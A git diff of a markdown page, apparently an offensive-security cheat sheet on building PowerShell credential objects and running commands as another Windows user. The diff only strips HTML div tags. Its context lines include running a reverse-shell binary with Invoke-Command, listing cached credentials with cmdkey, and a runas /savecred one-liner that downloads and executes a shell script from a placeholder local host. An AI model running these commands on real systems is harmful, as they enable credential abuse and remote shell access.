@@ -10,8 +10,6 @@ tags: ["powershell", "cred object", "Windows", "runas"]
 {{< tab set1 tab2 >}}Method #2{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 $username = '<DOMAIN>\<USER>'
 ```
@@ -24,12 +22,8 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential($username, $password)
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
-
-<div>
 
 ```console
 $username = '<DOMAIN>\<USER>'
@@ -51,8 +45,6 @@ $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
 ```
 
-</div>
-
 {{< /tabcontent >}}
 
 ### Runas (with cred object)
@@ -60,8 +52,6 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 {{< tab set2 tab1 active >}}Invoke-Command{{< /tab >}}
 {{< tab set2 tab2 >}}PSSession{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
-
-<div>
 
 ```console
 Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost
@@ -77,12 +67,8 @@ Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Comput
 Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -ConfigurationName config_name
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set2 tab2 >}}
-
-<div>
 
 ```console
 new-pssession -computername . -credential $cred
@@ -93,31 +79,19 @@ new-pssession -computername . -credential $cred
 enter-pssession 1
 ```
 
-</div>
-
 {{< /tabcontent >}}
 
 ### Runas (with cache creds)
 
 #### Check cache creds
 
-<div>
-
 ```console
 cmdkey /list
 ```
 
-</div>
-
 #### Run Command
-
-<div>
 
 ```console
 # e.g. Upload and run a shell
 runas /user:<DOMAIN>\<USER> /savecred "powershell iex(new-object net.webclient).downloadstring('http://<LOCAL_IP>/shell.ps1')"
 ```
-
-</div>
-
-<br>
